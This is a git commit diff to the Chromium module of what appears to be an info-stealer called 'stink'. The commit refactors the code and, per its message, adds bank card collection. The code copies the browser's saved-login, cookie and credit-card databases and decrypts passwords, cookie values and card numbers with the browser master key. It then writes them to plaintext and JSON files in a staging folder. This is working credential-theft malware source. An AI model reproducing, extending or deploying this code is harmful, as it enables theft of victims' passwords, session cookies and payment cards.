26b85d44d1b83ff8e812cedbe5560046c974a76d
Ink <andryvorobey123@gmail.com>
2021-12-18 20:17:30 +0300

    Optimization and new features
    Code optimization. Added bank card collection.

--- stink/browsers/chromium.py
+++ stink/browsers/chromium.py
@@ -13,22 +13,14 @@ class Chromium:
 
     def __init__(self, *args):
 
-        self.browser_name = args[0]
-        self.storage_path = args[1]
-        self.storage_folder = args[2]
+        variables = ["browser_name", "storage_path", "storage_folder", "state_path", "cookies_path", "passwords_path", "cards_path", "alt_cookies_path", "statuses", "errors"]
 
-        self.alt_cookies_path = args[6]
+        for index, variable in enumerate(variables):
+            self.__dict__.update({variable: args[index]})
 
-        self.statuses = args[7]
-        self.errors = args[8]
+    def __check_paths(self):
 
-        self.state_path = args[3]
-        self.cookies_path = args[4]
-        self.passwords_path = args[5]
-
-    def __check_files(self):
-
-        if any([path.exists(self.passwords_path), path.exists(self.cookies_path)]) and any(self.statuses):
+        if any([path.exists(self.passwords_path), path.exists(self.cookies_path), path.exists(self.alt_cookies_path), path.exists(self.cards_path)]) and any(self.statuses):
             mkdir(f"{self.storage_path}{self.storage_folder}{self.browser_name}")
 
     def __get_datetime(self, date):
@@ -52,117 +44,121 @@ class Chromium:
 
     def __write_passwords(self, cursor, master_key):
 
-        with open(f"{self.storage_path}{self.storage_folder}/{ self.browser_name}/{self.browser_name} Passwords.txt", "a", encoding="utf-8") as passwords:
+        with open(f"{self.storage_path}{self.storage_folder}/{ self.browser_name}/Passwords.txt", "a", encoding="utf-8") as passwords:
             for result in cursor.execute("SELECT action_url, username_value, password_value FROM logins").fetchall():
 
                 password = self.__decrypt(result[2], master_key)
 
                 if any(filter(lambda item: item != "", [result[0], result[1], password])):
                     passwords.write(f"URL: {result[0]}\nUsername: {result[1]}\nPassword: {password}\n\n")
-                else:
-                    continue
 
         passwords.close()
 
     def __write_cookies(self, cursor, master_key):
 
-        with open(f"{self.storage_path}{self.storage_folder}/{ self.browser_name}/{self.browser_name} Cookies.json", "a", encoding="utf-8") as cookies:
+        results = []
 
-            results = []
+        for result in cursor.execute("SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value FROM cookies").fetchall():
 
-            for result in cursor.execute("SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value FROM cookies").fetchall():
+            if not result[2]:
+                decrypted_value = self.__decrypt(result[6], master_key)
+            else:
+                decrypted_value = result[2]
 
-                if not result[2]:
-                    decrypted_value = self.__decrypt(result[6], master_key)
-                else:
-                    decrypted_value = result[2]
+            if any([bool(item) for item in result] + [bool(decrypted_value)]):
+                results.append({
+                    "host": result[0],
+                    "name": result[1],
+                    "value": decrypted_value,
+                    "creation_datetime": self.__get_datetime(result[3]),
+                    "last_access_datetime": self.__get_datetime(result[4]),
+                    "expires_datetime": self.__get_datetime(result[5])
+                })
 
-                if any([bool(item) for item in result] + [bool(decrypted_value)]):
-                    results.append({
-                        "host": result[0],
-                        "name": result[1],
-                        "value": decrypted_value,
-                        "creation_datetime": self.__get_datetime(result[3]),
-                        "last_access_datetime": self.__get_datetime(result[4]),
-                        "expires_datetime": self.__get_datetime(result[5])
-                    })
-                else:
-                    continue
+        with open(f"{self.storage_path}{self.storage_folder}/{ self.browser_name}/Cookies.json", "a", encoding="utf-8") as cookies:
 
             dump(results, cookies)
 
         cookies.close()
 
-    def __check_passwords(self):
+    def __write_cards(self, cursor, master_key):
 
-        try:
+        with open(f"{self.storage_path}{self.storage_folder}/{self.browser_name}/Cards.txt", "a", encoding="utf-8") as cards:
+            for result in cursor.execute("SELECT * FROM credit_cards").fetchall():
 
-            if self.statuses[0] is True:
+                password = self.__decrypt(result[4], master_key)
 
-                if (path.exists(self.passwords_path)) is True:
-                    copyfile(self.passwords_path, f"{self.storage_path}{self.browser_name} Passwords.db")
-                else:
-                    if self.errors is True:
-                        print(f"[{self.browser_name.upper()}]: No passwords found")
-                    return
+                if any(filter(lambda item: item != "", [result[1], result[2], result[3], password])):
+                    cards.write(f"Username: {result[1]}\nNumber: {password}\nExpire Month: {result[2]}\nExpire Year: {result[3]}\n\n")
 
-                with connect(f"{self.storage_path}{self.browser_name} Passwords.db") as connection:
-                    cursor = connection.cursor()
-                    self.__write_passwords(cursor, self.__get_key())
-                    cursor.close()
+        cards.close()
 
-                connection.close()
-                remove(f"{self.storage_path}{self.browser_name} Passwords.db")
+    def __check_all(self):
 
-            else:
-                return
+        items = (
+            {
+                "status": self.statuses[0],
+                "name": "Passwords",
+                "path": self.passwords_path,
+                "alt_path": None,
+                "method": self.__write_passwords,
+                "error": "No passwords found"
+            },
+            {
+                "status": self.statuses[1],
+                "name": "Cookies",
+                "path": self.cookies_path,
+                "alt_path": self.alt_cookies_path,
+                "method": self.__write_cookies,
+                "error": "No cookies found"
+            },
+            {
+                "status": self.statuses[2],
+                "name": "Cards",
+                "path": self.cards_path,
+                "alt_path": None,
+                "method": self.__write_cards,
+                "error": "No cards found"
+            }
+        )
 
-        except Exception as e:
+        for item in items:
 
-            if self.errors is True:
-                print(f"[{self.browser_name.upper()}]: {repr(e)}")
+            try:
 
-    def __check_cookies(self):
+                if item["status"] is True:
 
-        try:
+                    if (path.exists(item["path"])) is True:
+                        copyfile(item["path"], f'{self.storage_path}{self.browser_name} {item["name"]}.db')
 
-            if self.statuses[1] is True:
+                    elif item["alt_path"] is not None and (path.exists(item["alt_path"])):
+                        copyfile(item["alt_path"], f'{self.storage_path}{self.browser_name} {item["name"]}.db')
 
-                if (path.exists(self.cookies_path)) is True:
-                    copyfile(self.cookies_path, f"{self.storage_path}{self.browser_name} Cookies.db")
+                    else:
+                        if self.errors is True:
+                            print(f'[{self.browser_name.upper()}]: {item["error"]}')
+                        return
 
-                elif (path.exists(self.alt_cookies_path)) is True:
-                    copyfile(self.alt_cookies_path, f"{self.storage_path}{self.browser_name} Cookies.db")
+                    with connect(f'{self.storage_path}{self.browser_name} {item["name"]}.db') as connection:
+                        connection.text_factory = lambda text: text.decode(errors="ignore")
+                        cursor = connection.cursor()
+                        item["method"](cursor, self.__get_key())
+                        cursor.close()
 
-                else:
-                    if self.errors is True:
-                        print(f"[{self.browser_name.upper()}]: No cookies found")
-                    return
+                    connection.close()
+                    remove(f'{self.storage_path}{self.browser_name} {item["name"]}.db')
 
-                with connect(f"{self.storage_path}{self.browser_name} Cookies.db") as connection:
-                    connection.text_factory = lambda text: text.decode(errors="ignore")
-                    cursor = connection.cursor()
-                    self.__write_cookies(cursor, self.__get_key())
-                    cursor.close()
+            except Exception as e:
 
-                connection.close()
-                remove(f"{self.storage_path}{self.browser_name} Cookies.db")
-
-            else:
-                return
-
-        except Exception as e:
-
-            if self.errors is True:
-                print(f"[{self.browser_name.upper()}]: {repr(e)}")
+                if self.errors is True:
+                    print(f"[{self.browser_name.upper()}]: {repr(e)}")
 
     def run(self):
 
         try:
 
-            self.__check_files()
-            self.__check_passwords()
-            self.__check_cookies()
+            self.__check_paths()
+            self.__check_all()
 
         except Exception as e:
 
